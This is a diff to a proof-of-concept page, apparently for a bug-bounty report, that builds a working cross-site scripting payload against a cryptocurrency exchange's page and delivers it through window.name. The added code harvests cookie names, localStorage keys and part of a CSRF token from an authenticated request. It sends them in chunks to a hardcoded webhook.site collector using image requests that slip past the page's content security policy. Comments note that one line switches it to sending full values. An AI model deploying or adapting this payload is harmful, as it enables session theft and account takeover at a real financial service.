@@ -35,6 +35,7 @@
         reach from inside that origin.</li>
   </ol>
 
+  <p id="oobstat" style="color:#5e6673;font-size:12px;margin:18px 0 0"></p>
   <small>PoC - authorized security testing</small>
 </div>
 
@@ -57,12 +58,41 @@ var SINK = "https://www.kucoin.com/express/agreements/auto-conversion"
 // attribute. Read-only: it proves the origin it runs in and what that origin
 // authorises. It sends nothing to any third party.
 // ---------------------------------------------------------------------------
-function payload() {
+function payload(OOB) {
   var esc = function (s) {
     return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
   };
   var rows = [];
   var add = function (k, v) { rows.push('<tr><th align=left>' + esc(k) + '</th><td>' + esc(v) + '</td></tr>'); };
+
+  // Out-of-band proof of egress. Chunked image GETs, because connect-src on
+  // this route enumerates 62 hosts with no wildcard: fetch/sendBeacon to an
+  // external host is blocked, img-src https: data: is not.
+  // Chunk the RAW string and encode each chunk - encoding first and slicing
+  // after splits a percent-escape across a boundary and corrupts reassembly.
+  // On reassembly filter by n as well as i, or an earlier run with a different
+  // chunk count collides on index 0.
+  var beacon = function (obj) {
+    if (!OOB) return 'not configured';
+    var s = JSON.stringify(obj), N = 1000, n = Math.ceil(s.length / N);
+    // local signal written BEFORE the sends, so a blocked channel is
+    // distinguishable from a payload that never ran
+    document.title = 'M125-OOB-SENDING-' + n;
+    for (var i = 0; i < n; i++) {
+      new Image().src = OOB + (OOB.indexOf('?') < 0 ? '?' : '&')
+        + 'm=M125&i=' + i + '&n=' + n
+        + '&d=' + encodeURIComponent(s.slice(i * N, (i + 1) * N));
+    }
+    // window.URL, not URL. This code runs inside an inline event handler, so
+    // the scope chain is element -> document -> window and a bare identifier
+    // hits document's properties first: `URL` resolves to document.URL, which
+    // is a string, and `new URL(...)` throws "URL is not a constructor". Same
+    // mechanism that makes href=javascript:name resolve window.name. Any
+    // global that collides with a document property needs the window. prefix.
+    var host = '(unparsed)';
+    try { host = new window.URL(OOB).host; } catch (e) { }
+    return n + ' chunk(s) sent to ' + host;
+  };
 
   var render = function () {
     document.documentElement.innerHTML =
@@ -75,28 +105,61 @@ function payload() {
     document.title = 'M125-XSS-EXECUTED';
   };
 
-  add('location.origin', location.origin);
-  add('document.cookie length', document.cookie.length + ' chars, '
-    + (document.cookie ? document.cookie.split(';').length : 0) + ' cookies readable from script');
-
+  var cookieNames = document.cookie
+    ? document.cookie.split(';').map(function (c) { return c.split('=')[0].trim(); })
+    : [];
   var ls = [];
   try { ls = Object.keys(localStorage); } catch (e) { ls = ['<unreadable: ' + e + '>']; }
+  var authKeys = ls.filter(function (k) { return /auth|login|token|csrf|session|uid/i.test(k); });
+
+  // What leaves the origin: names, counts and lengths. The names are what
+  // identify the session material and are what a triager needs to see arrive
+  // at an attacker-controlled host; the values are what should not be parked
+  // on a third party. One line below swaps that if the program asks for it.
+  var summary = {
+    marker: 'M125',
+    origin: location.origin,
+    href: location.href.slice(0, 200),
+    cookieChars: document.cookie.length,
+    cookieCount: cookieNames.length,
+    cookieNames: cookieNames,
+    localStorageCount: ls.length,
+    localStorageKeys: ls,
+    authLookingKeys: authKeys,
+    userInfo: null
+  };
+
+  add('location.origin', location.origin);
+  add('document.cookie length', summary.cookieChars + ' chars, ' + summary.cookieCount + ' cookies readable from script');
+  add('cookie names', cookieNames.join(', ') || '(none)');
   add('localStorage keys', ls.length);
-  add('auth-looking keys', ls.filter(function (k) {
-    return /auth|login|token|csrf|session|uid/i.test(k);
-  }).join(', ') || '(none)');
+  add('auth-looking keys', authKeys.join(', ') || '(none)');
+
+  var finish = function () { add('OOB beacon', beacon(summary)); render(); };
 
   // Same-origin authenticated read. The session cookie rides along
   // automatically, so HttpOnly is irrelevant from inside this origin.
   fetch('/_api/ucenter/user-info', { credentials: 'include' })
-    .then(function (r) { add('GET /_api/ucenter/user-info', 'HTTP ' + r.status); return r.text(); })
+    .then(function (r) {
+      summary.userInfo = { status: r.status };
+      add('GET /_api/ucenter/user-info', 'HTTP ' + r.status);
+      return r.text();
+    })
     .then(function (t) {
       var csrf = (t.match(/"csrf"\s*:\s*"([^"]+)"/) || [])[1];
+      summary.userInfo.bodyChars = t.length;
+      summary.userInfo.csrfPresent = !!csrf;
+      summary.userInfo.csrfChars = csrf ? csrf.length : 0;
+      summary.userInfo.csrfPrefix = csrf ? csrf.slice(0, 6) : null;
       add('csrf in response body', csrf ? 'present, ' + csrf.length + ' chars, starts ' + csrf.slice(0, 6) + '...' : 'not present');
       add('response body length', t.length + ' chars');
-      render();
+      finish();
     })
-    .catch(function (e) { add('GET /_api/ucenter/user-info', 'failed: ' + e); render(); });
+    .catch(function (e) {
+      summary.userInfo = { error: String(e) };
+      add('GET /_api/ucenter/user-info', 'failed: ' + e);
+      finish();
+    });
 
   render();
 }
@@ -105,10 +168,22 @@ function payload() {
 // Build the window name. The payload goes inside an onerror attribute, so
 // & and " are HTML-escaped (& first) and the parser decodes them back.
 // ---------------------------------------------------------------------------
-var CODE = '(' + payload.toString() + ')()';
+// The out-of-band collector. Swap this one line for your own endpoint.
+// Baked in deliberately: nothing appears in the address bar, so the link in
+// the recording is a bare page URL with no PoC rigging visible.
+// Set it to '' to render in-page only and send nothing anywhere.
+var OOB = 'https://webhook.site/019a9a38-8a47-4cac-a52d-45d1566d294e';
+
+var CODE = '(' + payload.toString() + ')(' + JSON.stringify(OOB) + ')';
 var NAME = '<img src=x onerror="'
   + CODE.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
   + '">';
+
+// Host only, never the full URL: this is on screen while recording, and the
+// collector's token should not be.
+document.getElementById('oobstat').textContent = OOB
+  ? 'collector armed: ' + ((OOB.match(/^[a-z][a-z0-9+.-]*:\/\/([^\/?#]+)/i) || [])[1] || 'set')
+  : 'collector not set: the payload will render in-page only and send nothing.';
 
 // ---------------------------------------------------------------------------
 // Delivery. Two rules, both measured:
